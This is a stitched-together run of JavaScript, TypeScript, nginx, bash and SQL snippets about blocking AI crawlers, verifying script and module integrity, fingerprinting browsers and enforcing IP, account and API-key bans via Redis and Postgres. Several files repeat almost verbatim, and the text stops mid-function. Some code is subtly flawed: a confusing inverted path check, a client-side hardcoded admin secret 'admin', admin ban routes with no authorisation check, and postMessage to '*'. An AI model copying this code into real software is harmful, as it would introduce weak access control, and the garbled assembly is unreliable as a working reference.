interface Person {
  firstName: string;
  lastName:  string;
}

function greeter(person: Person) {
  return "Hello, " + person.firstName + " " + person.lastName;
}

let user = {
	firstName: "Malcolm",
  lastName:  "Reynolds"
};

document.querySelector("#app").innerHTML = greeter(user);
// Express middleware: block known AI crawler user agents
const blockedAgents = [
  /GPTBot/i,
  /ClaudeBot/i,
  /PerplexityBot/i,
  /Copilot/i
];

function blockAICrawlers(req, res, next) {
  const ua = req.get('User-Agent') || '';
  if (blockedAgents.some(re => re.test(ua))) {
    return res.status(403).send('Access denied');
  }
  next();
}

// Usage
const express = require('express');
const app = express();
app.use(blockAICrawlers);
// block-ai-crawlers.js
const fs = require('fs');
const blockedRegexes = [
  /GPTBot/i,
  /OAI-SearchBot/i,
  /ClaudeBot/i,
  /Claude-SearchBot/i,
  /Claude-User/i,
  /PerplexityBot/i,
  /Perplexity-User/i,
  /Copilot/i
];

function blockAICrawlers(req, res, next) {
  const ua = req.get('User-Agent') || '';
  const ip = req.ip || req.connection.remoteAddress || 'unknown';
  const asn = req.get('X-Forwarded-ASN') || 'unknown';
  if (blockedRegexes.some(re => re.test(ua))) {
    const entry = `${new Date().toISOString()} BLOCKED UA="${ua}" PATH="${req.path}" IP=${ip} ASN=${asn}\n`;
    fs.appendFile('/var/log/ai-blocks.log', entry, () => {});
    return res.status(403).send('Access denied');
  }
  next();
}

module.exports = blockAICrawlers;
# block by UA (simple)
map $http_user_agent $block_ai {
    default 0;
    "~*GPTBot" 1;
    "~*OAI-SearchBot" 1;
    "~*ClaudeBot" 1;
    "~*PerplexityBot" 1;
    "~*Copilot" 1;
}

server {
    listen 80;
    server_name example.com;

    if ($block_ai) {
        return 403;
    }

    location ~* \.(pdf|jpg|jpeg|png|gif|json)$ {
        add_header X-Robots-Tag "noindex, nofollow";
    }

    # normal site config...
}
// module-guard.js — run this very early (e.g., node -r ./module-guard.js app.js)
const fs = require('fs');
const crypto = require('crypto');
const Module = require('module');
const path = require('path');

const ALLOWED_HASHES = {
  // relative path -> expected sha256 hex
  // "node_modules/some-package/index.js": "abc123..."
};

// compute file hash
function sha256File(filePath) {
  const data = fs.readFileSync(filePath);
  return crypto.createHash('sha256').update(data).digest('hex');
}

// resolve and verify before loading
const originalLoad = Module._load;
Module._load = function(request, parent, isMain) {
  try {
    const resolved = Module._resolveFilename(request, parent, isMain);
    // only verify local files (skip core modules)
    if (resolved && !resolved.startsWith('node:') && !path.isAbsolute(resolved) === false) {
      const rel = path.relative(process.cwd(), resolved);
      if (ALLOWED_HASHES[rel]) {
        const h = sha256File(resolved);
        if (h !== ALLOWED_HASHES[rel]) {
          throw new Error(`Module integrity check failed for ${rel}`);
        }
      } else {
        throw new Error(`Module ${rel} is not in allowlist`);
      }
    }
  } catch (err) {
    // log and fail fast
    console.error(`[module-guard] blocked module: ${err.message}`);
    const e = new Error('Access to requested module denied');
    e.code = 'MODULE_BLOCKED';
    throw e;
  }
  return originalLoad.apply(this, arguments);
};
#!/usr/bin/env bash
WATCH_DIR="/var/www/site"
FILES=("robots.txt" "css/canonical.css" "node_modules")
LOG="/var/log/integrity-monitor.log"

inotifywait -m -r -e modify,create,delete --format '%w%f %e' "$WATCH_DIR" | while read file event; do
  echo "$(date -u) CHANGE $file $event" >> "$LOG"
  cd "$WATCH_DIR" || continue
  # conservative: only revert tracked files
  if git ls-files --error-unmatch "$file" >/dev/null 2>&1; then
    git checkout -- "$file"
    echo "$(date -u) Reverted $file" >> "$LOG"
    # send alert (replace with your alerting)
    logger -t integrity-monitor "Reverted $file; see $LOG"
  fi
done
const ALLOWED_SCRIPTS = new Set([
  location.origin + '/app.bundle.js',
  'https://trusted.cdn.example/lib.js'
]);

function isAllowedNode(node) {
  if (node.tagName === 'SCRIPT' && node.src) {
    return ALLOWED_SCRIPTS.has(node.src);
  }
  if (node.tagName === 'LINK' && node.rel === 'stylesheet' && node.href) {
    return true; // optionally check allowlist for styles
  }
  return false;
}

const observer = new MutationObserver(muts => {
  for (const m of muts) {
    for (const n of m.addedNodes) {
      if (n.nodeType !== 1) continue;
      if ((n.tagName === 'SCRIPT' || n.tagName === 'LINK') && !isAllowedNode(n)) {
        n.remove();
        console.warn('Removed unauthorized node', n);
      }
    }
  }
});

observer.observe(document.documentElement, { childList: true, subtree: true });

// Reapply canonical stylesheet if it is removed or its href changes
(function() {
  const canonicalId = 'canonical-stylesheet';
  const canonicalHref = '/css/canonical.css';

  function ensureStylesheet() {
    let link = document.getElementById(canonicalId);
    if (!link) {
      link = document.createElement('link');
      link.id = canonicalId;
      link.rel = 'stylesheet';
      link.href = canonicalHref;
      document.head.appendChild(link);
      return;
    }
    if (link.href.indexOf(canonicalHref) === -1) {
      link.href = canonicalHref;
    }
  }

  // Watch for head mutations that remove or alter the stylesheet
  const observer = new MutationObserver(mutations => {
    for (const m of mutations) {
      if (m.type === 'childList' || m.type === 'attributes') {
        ensureStylesheet();
      }
    }
  });

  observer.observe(document.head, { childList: true, subtree: true, attributes: true, attributeFilter: ['href', 'rel', 'id'] });

  // Also run once on load
  ensureStylesheet();
})();

if (window.trustedTypes) {
  window.trustedTypes.createPolicy('default', {
    createHTML: (s) => { throw new Error('createHTML blocked'); },
    createScript: (s) => { throw new Error('createScript blocked'); },
    createScriptURL: (s) => { throw new Error('createScriptURL blocked'); }
  });
}

const ALLOWED_HASHES = {
  '/modules/widget-v1.js': 'sha256-EXPECTED_BASE64_HASH'
};

async function loadModuleSafely(url) {
  const resp = await fetch(url, { credentials: 'same-origin' });
  if (!resp.ok) throw new Error('Fetch failed');
  const buf = await resp.arrayBuffer();
  const hashBuf = await crypto.subtle.digest('SHA-256', buf);
  const hashBase64 = btoa(String.fromCharCode(...new Uint8Array(hashBuf)));
  const computed = 'sha256-' + hashBase64;
  if (ALLOWED_HASHES[url] !== computed) throw new Error('Integrity mismatch');
  const blob = new Blob([buf], { type: 'application/javascript' });
  const blobUrl = URL.createObjectURL(blob);
  const script = document.createElement('script');
  script.type = 'module';
  script.src = blobUrl;
  document.head.appendChild(script);
  // revoke after load to reduce memory
  script.onload = () => URL.revokeObjectURL(blobUrl);
}

// Usage
loadModuleSafely('/modules/widget-v1.js').catch(e => {
  console.error('Blocked module load:', e);
});

const ALLOWED_SCRIPTS = new Set([
  location.origin + '/app.bundle.js',
  'https://trusted.cdn.example/lib.js'
]);

function isAllowedNode(node) {
  if (node.tagName === 'SCRIPT' && node.src) {
    return ALLOWED_SCRIPTS.has(node.src);
  }
  if (node.tagName === 'LINK' && node.rel === 'stylesheet' && node.href) {
    return true; // optionally check allowlist for styles
  }
  return false;
}

const observer = new MutationObserver(muts => {
  for (const m of muts) {
    for (const n of m.addedNodes) {
      if (n.nodeType !== 1) continue;
      if ((n.tagName === 'SCRIPT' || n.tagName === 'LINK') && !isAllowedNode(n)) {
        n.remove();
        console.warn('Removed unauthorized node', n);
      }
    }
  }
});

observer.observe(document.documentElement, { childList: true, subtree: true });

/* ===== Trusted Types policy (blocks unsafe sinks unless explicitly allowed) ===== */
  if (window.trustedTypes) {
    try {
      window.trustedTypes.createPolicy('safePolicy', {
        createHTML: (s) => { throw new Error('createHTML blocked'); },
        createScript: (s) => { throw new Error('createScript blocked'); },
        createScriptURL: (s) => { throw new Error('createScriptURL blocked'); }
      });
    } catch (e) {
      console.warn('TrustedTypes policy creation failed or already exists.');
    }
  }

  /* ===== Allowlist of module URLs and expected SHA-256 (base64) =====
     In production, populate this map from CI (compute hashes at build time).
     Format: 'url': 'sha256-BASE64'
  */
  const ALLOWED_MODULES = {
    '/modules/widget-v1.js': 'sha256-REPLACE_WITH_BASE64_HASH'
  };

  /* Utility: compute base64 SHA-256 of ArrayBuffer */
  async function sha256Base64(buffer) {
    const hash = await crypto.subtle.digest('SHA-256', buffer);
    const bytes = new Uint8Array(hash);
    let binary = '';
    for (let i = 0; i < bytes.byteLength; i++) binary += String.fromCharCode(bytes[i]);
    return btoa(binary);
  }

  /* ===== Safe dynamic module loader: fetch -> verify -> execute as module ===== */
  async function loadModuleSafely(url) {
    try {
      if (!ALLOWED_MODULES[url]) throw new Error('Module not allowlisted');
      const resp = await fetch(url, { credentials: 'same-origin' });
      if (!resp.ok) throw new Error('Fetch failed: ' + resp.status);
      const buf = await resp.arrayBuffer();
      const base64 = await sha256Base64(buf);
      const computed = 'sha256-' + base64;
      if (computed !== ALLOWED_MODULES[url]) throw new Error('Integrity mismatch');
      const blob = new Blob([buf], { type: 'application/javascript' });
      const blobUrl = URL.createObjectURL(blob);
      const script = document.createElement('script');
      script.type = 'module';
      script.src = blobUrl;
      document.head.appendChild(script);
      script.onload = () => {
        URL.revokeObjectURL(blobUrl);
        console.info('Module loaded safely:', url);
      };
      script.onerror = (e) => {
        URL.revokeObjectURL(blobUrl);
        console.error('Module execution failed', e);
      };
    } catch (err) {
      console.error('Blocked module load:', err);
      document.getElementById('status').textContent = 'Module blocked: ' + err.message;
    }
  }

  document.getElementById('load-widget').addEventListener('click', () => {
    loadModuleSafely('/modules/widget-v1.js');
  });

  /* ===== MutationObserver: remove unauthorized <script> and <link> nodes ===== */
  const ALLOWED_SCRIPT_SRCS = new Set([
    location.origin + '/app.bundle.js',
    'https://trusted.cdn.example/lib.js'
  ]);

  function nodeIsAllowed(node) {
    if (node.tagName === 'SCRIPT' && node.src) {
      return ALLOWED_SCRIPT_SRCS.has(node.src);
    }
    if (node.tagName === 'LINK' && node.rel === 'stylesheet' && node.href) {
      // allow styles from same origin or trusted CDN (adjust as needed)
      return node.href.startsWith(location.origin) || node.href.includes('trusted.cdn.example');
    }
    return true;
  }

  const observer = new MutationObserver(muts => {
    for (const m of muts) {
      for (const n of m.addedNodes) {
        if (n.nodeType !== 1) continue;
        if ((n.tagName === 'SCRIPT' || n.tagName === 'LINK') && !nodeIsAllowed(n)) {
          console.warn('Removed unauthorized node', n);
          n.remove();
          document.getElementById('status').textContent = 'Removed unauthorized resource';
        }
      }
    }
  });

  observer.observe(document.documentElement, { childList: true, subtree: true });

  /* ===== Simple integrity canary and periodic self-check ===== */
  function checkCanonicalStyle() {
    const style = document.getElementById('canonical-style');
    if (!style) {
      // reinsert minimal critical style if removed
      const s = document.createElement('style');
      s.id = 'canonical-style';
      s.textContent = ':root{--bg:#0b5cff;--fg:#fff}body{background:var(--bg)!important;color:var(--fg)!important}';
      document.head.appendChild(s);
      document.getElementById('status').textContent = 'Reapplied critical styles';
      console.warn('Reapplied canonical style');
    }
  }
  setInterval(checkCanonicalStyle, 5000);

  /* ===== Sandboxed iframe communication (postMessage with validation) ===== */
  const iframe = document.getElementById('sandbox');
  iframe.addEventListener('load', () => {
    // send a short-lived token or init message
    iframe.contentWindow.postMessage({ cmd: 'init', nonce: 'short-lived-token' }, '*');
  });

  window.addEventListener('message', e => {
    if (e.source !== iframe.contentWindow) return;
    // Strictly validate message shape and origin if using src instead of srcdoc
    const data = e.data;
    if (data && data.type === 'pong' && data.nonce === 'short-lived-token') {
      console.info('Sandbox responded correctly');
    } else {
      console.warn('Unexpected message from sandbox', data);
    }
  });

  /* ===== Minimal logging endpoint (demo: console only). Replace with secure server endpoint in production. ===== */
  function logEvent(level, msg) {
    console[level](msg);
    // Example: send to /log endpoint with fetch (ensure CORS and auth)
    // fetch('/log', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({level,msg,t:Date.now()}) });
  }

  // Expose for debugging in demo
  window.__demo = { loadModuleSafely, ALLOWED_MODULES, logEvent };/* ===== Simple fingerprint (userAgent + platform + timezone + canvas hash) ===== */
async function canvasHash() {
  try {
    const c = document.createElement('canvas');
    c.width = 200; c.height = 50;
    const ctx = c.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '16px Arial';
    ctx.fillStyle = '#f60';
    ctx.fillRect(0, 0, 200, 50);
    ctx.fillStyle = '#069';
    ctx.fillText('fingerprint-demo-'+navigator.userAgent, 2, 2);
    const data = c.toDataURL();
    const b = atob(data.split(',')[1]);
    const arr = new Uint8Array(b.length);
    for (let i=0;i<b.length;i++) arr[i]=b.charCodeAt(i);
    const hashBuf = await crypto.subtle.digest('SHA-256', arr);
    const hashArray = Array.from(new Uint8Array(hashBuf));
    return hashArray.map(b => b.toString(16).padStart(2,'0')).join('');
  } catch (e) {
    return 'no-canvas';
  }
}

async function computeFingerprint() {
  const ua = navigator.userAgent || 'unknown';
  const platform = navigator.platform || 'unknown';
  const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown';
  const ch = await canvasHash();
  const raw = `${ua}|${platform}|${tz}|${ch}`;
  const enc = new TextEncoder().encode(raw);
  const hashBuf = await crypto.subtle.digest('SHA-256', enc);
  const hashArray = Array.from(new Uint8Array(hashBuf));
  return hashArray.map(b => b.toString(16).padStart(2,'0')).join('');
}

/* ===== Local banlist storage helpers ===== */
const BAN_KEY = 'local_banlist_v1';
function readBanlist() {
  try {
    const raw = localStorage.getItem(BAN_KEY);
    return raw ? JSON.parse(raw) : [];
  } catch (e) { return []; }
}
function writeBanlist(list) {
  localStorage.setItem(BAN_KEY, JSON.stringify(list));
}

/* ===== Enforcement: overlay + event blocking ===== */
function showBanOverlay() {
  const ov = document.getElementById('ban-overlay');
  ov.style.display = 'flex';
  // block pointer events on body
  document.body.style.pointerEvents = 'none';
  ov.style.pointerEvents = 'auto';
}
function hideBanOverlay() {
  const ov = document.getElementById('ban-overlay');
  ov.style.display = 'none';
  document.body.style.pointerEvents = '';
}

/* Prevent common interactions when banned */
function attachGlobalBlockers() {
  function stop(e){ e.stopImmediatePropagation(); e.preventDefault(); }
  ['click','keydown','submit','pointerdown','contextmenu'].forEach(ev => {
    window.addEventListener(ev, stop, true);
  });
}

/* ===== Ban management ===== */
async function isCurrentBanned() {
  const fp = await computeFingerprint();
  const list = readBanlist();
  return list.includes(fp);
}
async function addCurrentToBanlist() {
  const fp = await computeFingerprint();
  const list = readBanlist();
  if (!list.includes(fp)) {
    list.push(fp);
    writeBanlist(list);
    // set cookie for extra persistence (expires 1 year)
    document.cookie = `site_banned=1; max-age=${60*60*24*365}; path=/; SameSite=Lax`;
    log('Added fingerprint to local banlist: ' + fp.slice(0,12) + '...');
  }
  enforceIfBanned();
}
function clearLocalBanlist() {
  writeBanlist([]);
  document.cookie = 'site_banned=; max-age=0; path=/';
  log('Cleared local banlist');
  hideBanOverlay();
}

/* ===== Attempt to register a service worker and pass ban info (works only on HTTPS/origin) ===== */
async function tryRegisterSWAndSetBan() {
  if (!('serviceWorker' in navigator)) {
    log('Service worker not supported in this environment');
    return;
  }
  try {
    // In a real deployment, /sw.js should be served from your origin and implement fetch blocking.
    const reg = await navigator.serviceWorker.register('/sw.js').catch(()=>null);
    if (!reg) { log('SW registration failed or blocked'); return; }
    const fp = await computeFingerprint();
    // send message to SW to store ban (SW must implement message handler)
    if (reg.active) {
      reg.active.postMessage({ type: 'SET_BAN', fingerprint: fp });
      log('Requested SW to set ban for fingerprint');
    } else {
      log('SW registered but not active yet');
    }
  } catch (e) {
    log('SW error: ' + e.message);
  }
}

/* ===== Enforcement check on load and periodic re-check ===== */
async function enforceIfBanned() {
  const banned = await isCurrentBanned();
  if (banned || document.cookie.includes('site_banned=1')) {
    showBanOverlay();
    attachGlobalBlockers();
    log('Client is restricted locally');
  } else {
    hideBanOverlay();
    log('Client not restricted');
  }
}

/* ===== Simple logging helper (demo only) ===== */
function log(msg) {
  const el = document.getElementById('log');
  const t = new Date().toISOString();
  el.textContent = `[${t}] ${msg}\n` + el.textContent;
  console.log(msg);
}

/* ===== UI wiring ===== */
document.getElementById('ban-me').addEventListener('click', () => {
  addCurrentToBanlist();
});
document.getElementById('clear-ban').addEventListener('click', () => {
  clearLocalBanlist();
});
document.getElementById('appeal').addEventListener('click', () => {
  alert('Appeal request recorded (demo). In production, send to server for review.');
});

/* Admin ban button (demo: requires matching secret) */
document.getElementById('admin-ban').addEventListener('click', async () => {
  const secret = document.getElementById('admin-secret').value || '';
  const adminSecret = 'admin'; // demo secret; replace with secure server-side auth
  if (secret !== adminSecret) { alert('Invalid admin secret'); return; }
  await addCurrentToBanlist();
  await tryRegisterSWAndSetBan();
});

/* Run initial enforcement and periodic checks */
enforceIfBanned();
setInterval(enforceIfBanned, 10_000); // re-check every 10s

/* Expose functions for debugging in console */
window.__banDemo = { computeFingerprint, addCurrentToBanlist, clearLocalBanlist, readBanlist };
// ban-middleware.js
const redis = require('redis').createClient();
const db = require('./db'); // pg client

async function isBanned(type, value) {
  const key = `ban:${type}:${value}`;
  const cached = await redis.get(key);
  if (cached) return JSON.parse(cached);
  const res = await db.query('SELECT * FROM bans WHERE subject_type=$1 AND subject_value=$2 AND active=true', [type, value]);
  if (res.rowCount) {
    const ban = res.rows[0];
    const ttl = ban.expires_at ? Math.max(0, new Date(ban.expires_at) - Date.now()) : null;
    if (ttl) await redis.setEx(key, Math.ceil(ttl/1000), JSON.stringify(ban));
    else await redis.set(key, JSON.stringify(ban));
    return ban;
  }
  return null;
}

module.exports = function banMiddleware() {
  return async function (req, res, next) {
    try {
      const ip = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
      const apiKey = req.get('x-api-key') || null;
      const accountId = req.user && req.user.id ? String(req.user.id) : null;

      const checks = [
        isBanned('ip', ip),
        apiKey ? isBanned('api_key', apiKey) : null,
        accountId ? isBanned('account', accountId) : null
      ].filter(Boolean);

      for (const p of checks) {
        const ban = await p;
        if (ban) {
          // log and block
          req.app.logger.warn({ event: 'ban_block', ip, apiKey, accountId, ban });
          return res.status(403).json({ error: 'Access denied', reason: ban.reason || 'restricted' });
        }
      }
      next();
    } catch (err) {
      next(err);
    }
  };
};
POST /admin/bans
Authorization: Bearer <admin-token>
Content-Type: application/json

{
  "subject_type":"ip",
  "subject_value":"203.0.113.45",
  "reason":"credential stuffing",
  "expires_at":"2026-03-07T12:00:00Z"
}
-- bans table
CREATE TABLE bans (
  id BIGSERIAL PRIMARY KEY,
  subject_type TEXT NOT NULL, -- 'ip'|'account'|'api_key'|'fingerprint'|'asn'|'tls_ja3'
  subject_value TEXT NOT NULL,
  reason TEXT,
  created_by TEXT,
  created_at TIMESTAMPTZ DEFAULT now(),
  expires_at TIMESTAMPTZ NULL,
  active BOOLEAN DEFAULT true
);
CREATE INDEX ON bans(subject_type, subject_value);

-- linked identities (to correlate multiple labels to one actor)
CREATE TABLE actor_links (
  id BIGSERIAL PRIMARY KEY,
  actor_id TEXT NOT NULL, -- opaque actor id (e.g., UUID)
  label_type TEXT NOT NULL, -- 'ip'|'fingerprint'|'api_key'|'account'|'asn'|'tls_ja3'
  label_value TEXT NOT NULL,
  seen_at TIMESTAMPTZ DEFAULT now()
);
CREATE INDEX ON actor_links(actor_id);
CREATE INDEX ON actor_links(label_type, label_value);
// ban-enforce.js
const redis = require('redis').createClient();
const db = require('./db'); // pg client
const { pushToEdge } = require('./edge-integration'); // pluggable

async function redisGetBan(type, value) {
  const key = `ban:${type}:${value}`;
  const raw = await redis.get(key);
  return raw ? JSON.parse(raw) : null;
}

async function dbGetBan(type, value) {
  const res = await db.query(
    'SELECT * FROM bans WHERE subject_type=$1 AND subject_value=$2 AND active=true LIMIT 1',
    [type, value]
  );
  return res.rowCount ? res.rows[0] : null;
}

async function isBanned(type, value) {
  const cached = await redisGetBan(type, value);
  if (cached) return cached;
  const ban = await dbGetBan(type, value);
  if (ban) {
    const key = `ban:${type}:${value}`;
    if (ban.expires_at) {
      const ttl = Math.max(0, Math.floor((new Date(ban.expires_at) - Date.now()) / 1000));
      await redis.setEx(key, ttl || 1, JSON.stringify(ban));
    } else {
      await redis.set(key, JSON.stringify(ban));
    }
    return ban;
  }
  return null;
}

function extractLabels(req) {
  const ip = (req.headers['x-forwarded-for'] || req.ip || '').split(',')[0].trim();
  const ua = req.get('user-agent') || '';
  const apiKey = req.get('x-api-key') || null;
  const accountId = req.user && req.user.id ? String(req.user.id) : null;
  const asn = req.get('x-forwarded-asn') || null;
  const tlsJa3 = req.get('x-ja3') || null; // requires edge to populate
  const fingerprint = req.get('x-device-fp') || null; // optional client-sent fingerprint
  return { ip, ua, apiKey, accountId, asn, tlsJa3, fingerprint };
}

module.exports = function banMiddleware(options = {}) {
  return async function (req, res, next) {
    try {
      const labels = extractLabels(req);
      // check high-confidence labels first
      const checks = [
        isBanned('ip', labels.ip),
        labels.apiKey ? isBanned('api_key', labels.apiKey) : null,
        labels.accountId ? isBanned('account', labels.accountId) : null,
        labels.fingerprint ? isBanned('fingerprint', labels.fingerprint) : null,
        labels.asn ? isBanned('asn', labels.asn) : null,
        labels.tlsJa3 ? isBanned('tls_ja3', labels.tlsJa3) : null
      ].filter(Boolean);

      for (const p of checks) {
        const ban = await p;
        if (ban) {
          // optional: push to edge for immediate network block
          if (options.edgePush && options.edgePush.enabled) {
            pushToEdge(ban.subject_type, ban.subject_value).catch(() => {});
          }
          req.app.logger?.warn({ event: 'ban_block', labels, ban });
          return res.status(403).json({ error: 'Access denied', reason: ban.reason || 'restricted' });
        }
      }

      // behavioral scoring: increment actor score and escalate if threshold reached
      const actorId = req.get('x-actor-id') || null; // optional precomputed actor id
      if (actorId) {
        const scoreKey = `actor:${actorId}:score`;
        const score = await redis.incr(scoreKey);
        await redis.expire(scoreKey, 3600); // sliding window
        if (score >= (options.behaviorThreshold || 100)) {
          // create a temporary ban and push to DB + Redis
          const reason = 'behavioral threshold exceeded';
          const expiresAt = new Date(Date.now() + (options.temporaryBanSeconds || 3600) * 1000);
          await db.query(
            'INSERT INTO bans(subject_type, subject_value, reason, created_by, expires_at) VALUES($1,$2,$3,$4,$5)',
            ['actor', actorId, reason, 'auto', expiresAt]
          );
          const banObj = { subject_type: 'actor', subject_value: actorId, reason, expires_at: expiresAt };
          await redis.setEx(`ban:actor:${actorId}`, Math.ceil((expiresAt - Date.now())/1000), JSON.stringify(banObj));
          if (options.edgePush && options.edgePush.enabled) {
            pushToEdge('actor', actorId).catch(()=>{});
          }
          req.app.logger?.warn({ event: 'auto_ban', actorId, score });
          return res.status(403).json({ error: 'Access denied', reason });
        }
      }

      next();
    } catch (err) {
      next(err);
    }
  };
};
// admin-bans.js (Express routes)
const express = require('express');
const router = express.Router();
const db = require('./db');
const redis = require('redis').createClient();

router.post('/bans', async (req, res) => {
  const { subject_type, subject_value, reason, expires_at } = req.body;
  const created_by = req.user && req.user.id ? req.user.id : 'admin';
  const q = 'INSERT INTO bans(subject_type, subject_value, reason, created_by, expires_at) VALUES($1,$2,$3,$4,$5) RETURNING *';
  const r = await db.query(q, [subject_type, subject_value, reason, created_by, expires_at || null]);
  const ban = r.rows[0];
  const key = `ban:${subject_type}:${subject_value}`;
  if (ban.expires_at) {
    const ttl = Math.max(1, Math.floor((new Date(ban.expires_at) - Date.now())/1000));
    await redis.setEx(key, ttl, JSON.stringify(ban));
  } else {
    await redis.set(key, JSON.stringify(ban));
  }
  // optional: push to edge provider
  // await pushToEdge(subject_type, subject_value);
  res.json(ban);
});

router.post('/bans/revoke', async (req, res) => {
  const { id } = req.body;
  await db.query('UPDATE bans SET active=false WHERE id=$1', [id]);
  // remove from redis (best-effort)
  const banRow = await db.query('SELECT subject_type, subject_value FROM bans WHERE id=$1', [id]);
  if (banRow.rowCount) {
    const { subject_type, subject_value } = banRow.rows[0];
    await redis.del(`ban:${subject_type}:${subject_value}`);
  }
  res.json({ ok: true });
});

module.exports = router;
// edge-integration.js (stub)
async function pushToEdge(type, value) {
  // Implement provider-specific API calls here.
  // Example: Cloudflare IP list update, AWS WAF IPSet update, or call to your CDN purge/block API.
  // Keep idempotent and rate-limited.
  return Promise.resolve();
}
module.exports = { pushToEdge };
// correlate-worker.js (concept)
const db = require('./db');
async function correlate() {
  // find labels that co-occur in short windows and assign actor ids
  // pseudocode: for each recent request log, group labels and upsert actor_links
  // then merge actor_ids that share labels and update bans if necessary
}
setInterval(correlate, 60_000);
// ban-middleware.js (Express)
const redis = require('redis').createClient();
const db = require('./db'); // pg client

async function isBanned(type, value) {
  const key = `ban:${type}:${value}`;
  const cached = await redis.get(key);
  if (cached) return JSON.parse(cached);
  const res = await db.query(
    'SELECT * FROM bans WHERE subject_type=$1 AND subject_value=$2 AND active=true LIMIT 1',
    [type, value]
  );
  if (res.rowCount) {
    const ban = res.rows[0];
    if (ban.expires_at) {
      const ttl = Math.max(1, Math.floor((new Date(ban.expires_at) - Date.now())/1000));
      await redis.setEx(key, ttl, JSON.stringify(ban));
    } else {
      await redis.set(key, JSON.stringify(ban));
    }
    return ban;
  }
  return null;
}

module.exports = function banMiddleware(opts = {}) {
  return async function (req, res, next) {
    try {
      const ip = (req.headers['x-forwarded-for'] || req.ip || '').split(',')[0].trim();
      const apiKey = req.get('x-api-key') || null;
      const accountId = req.user && req.user.id ? String(req.user.id) : null;
      const asn = req.get('x-forwarded-asn') || null;
      const tlsJa3 = req.get('x-ja3') || null;
      const fingerprint = req.get('x-device-fp') || null;

      const checks = [
        isBanned('ip', ip),
        apiKey ? isBanned('api_key', apiKey) : null,
        accountId ? isBanned('account', accountId) : null,
        fingerprint ? isBanned('fingerprint', fingerprint) : null,
        asn ? isBanned('asn', asn) : null,
        tlsJa3 ? isBanned('tls_ja3', tlsJa3) : null
      ].filter(Boolean);

      for (const p of checks) {
        const ban = await p;
        if (ban) {
          req.app.logger?.warn({ event: 'ban_block', ip, apiKey, accountId, fingerprint, ban });
          return res.status(403).json({ error: 'Access denied', reason: ban.reason || 'restricted' });
        }
      }

      // Optional behavioral scoring and auto-escalation
      const actorId = req.get('x-actor-id') || null;
      if (actorId) {
        const scoreKey = `actor:${actorId}:score`;
        const score = await redis.incr(scoreKey);
        await redis.expire(scoreKey, 3600);
        if (score >= (opts.behaviorThreshold || 100)) {
          const reason = 'behavioral threshold exceeded';
          const expiresAt = new Date(Date.now() + (opts.temporaryBanSeconds || 3600) * 1000);
          await db.query(
            'INSERT INTO bans(subject_type, subject_value, reason, created_by, expires_at) VALUES($1,$2,$3,$4,$5)',
            ['actor', actorId, reason, 'auto', expiresAt]
          );
          const banObj = { subject_type: 'actor', subject_value: actorId, reason, expires_at: expiresAt };
          await redis.setEx(`ban:actor:${actorId}`, Math.ceil((expiresAt - Date.now())/1000), JSON.stringify(banObj));
          req.app.logger?.warn({ event: 'auto_ban', actorId, score });
          return res.status(403).json({ error: 'Access denied', reason });
        }
      }

      next();
    } catch (err) {
      next(err);
    }
  };
};
// admin-bans.js (Express)
const express = require('express');
const router = express.Router();
const db = require('./db');
const redis = require('redis').createClient();

router.post('/bans', async (req, res) => {
  const { subject_type, subject_value, reason, expires_at } = req.body;
  const created_by = req.user && req.user.id ? req.user.id : 'admin';
  const q = 'INSERT INTO bans(subject_type, subject_value, reason, created_by, expires_at) VALUES($1,$2,$3,$4,$5) RETURNING *';
  const r = await db.query(q, [subject_type, subject_value, reason, created_by, expires_at || null]);
  const ban = r.rows[0];
  const key = `ban:${subject_type}:${subject_value}`;
  if (ban.expires_at) {
    const ttl = Math.max(1, Math.floor((new Date(ban.expires_at) - Date.now())/1000));
    await redis.setEx(key, ttl, JSON.stringify(ban));
  } else {
    await redis.set(key, JSON.stringify(ban));
  }
  // optional: push to edge provider here
  res.json(ban);
});

router.post('/bans/revoke', async (req, res) => {
  const { id } = req.body;
  await db.query('UPDATE bans SET active=false WHERE id=$1', [id]);
  const banRow = await db.query('SELECT subject_type, subject_value FROM bans WHERE id=$1', [id]);
  if (banRow.rowCount) {
    const { subject_type, subject_value } = banRow.rows[0];
    await redis.del(`ban:${subject_type}:${subject_value}`);
    // optional: remove from edge provider
  }
  res.json({ ok: true });
});

module.exports = router;
// admin-bans.js (Express)
const express = require('express');
const router = express.Router();
const db = require('./db');
const redis = require('redis').createClient();

router.post('/bans', async (req, res) => {
  const { subject_type, subject_value, reason, expires_at } = req.body;
  const created_by = req.user && req.user.id ? req.user.id : 'admin';
  const q = 'INSERT INTO bans(subject_type, subject_value, reason, created_by, expires_at) VALUES($1,$2,$3,$4,$5) RETURNING *';
  const r = await db.query(q, [subject_type, subject_value, reason, created_by, expires_at || null]);
  const ban = r.rows[0];
  const key = `ban:${subject_type}:${subject_value}`;
  if (ban.expires_at) {
    const ttl = Math.max(1, Math.floor((new Date(ban.expires_at) - Date.now())/1000));
    await redis.setEx(key, ttl, JSON.stringify(ban));
  } else {
    await redis.set(key, JSON.stringify(ban));
  }
  // optional: push to edge provider here
  res.json(ban);
});

router.post('/bans/revoke', async (req, res) => {
  const { id } = req.body;
  await db.query('UPDATE bans SET active=false WHERE id=$1', [id]);
  const banRow = await db.query('SELECT subject_type, subject_value FROM bans WHERE id=$1', [id]);
  if (banRow.rowCount) {
    const { subject_type, subject_value } = banRow.rows[0];
    await redis.del(`ban:${subject_type}:${subject_value}`);
    // optional: remove from edge provider
  }
  res.json({ ok: true });
});

module.exports = router;
// ban-middleware.js
const redis = require('redis').createClient();
const db = require('./db'); // pg client

async function isBanned(type, value) {
  if (!value) return null;
  const key = `ban:${type}:${value}`;
  const cached = await redis.get(key);
  if (cached) return JSON.parse(cached);
  const res = await db.query(
    'SELECT * FROM bans WHERE subject_type=$1 AND subject_value=$2 AND active=true LIMIT 1',
    [type, value]
  );
  if (res.rowCount) {
    const ban = res.rows[0];
    if (ban.expires_at) {
      const ttl = Math.max(1, Math.floor((new Date(ban.expires_at) - Date.now())/1000));
      await redis.setEx(key, ttl, JSON.stringify(ban));
    } else {
      await redis.set(key, JSON.stringify(ban));
    }
    return ban;
  }
  return null;
}

module.exports = function banMiddleware(opts = {}) {
  return async function (req, res, next) {
    try {
      const ip = (req.headers['x-forwarded-for'] || req.ip || '').split(',')[0].trim();
      const apiKey = req.get('x-api-key') || null;
      const accountId = req.user && req.user.id ? String(req.user.id) : null;
      const fingerprint = req.get('x-device-fp') || null;
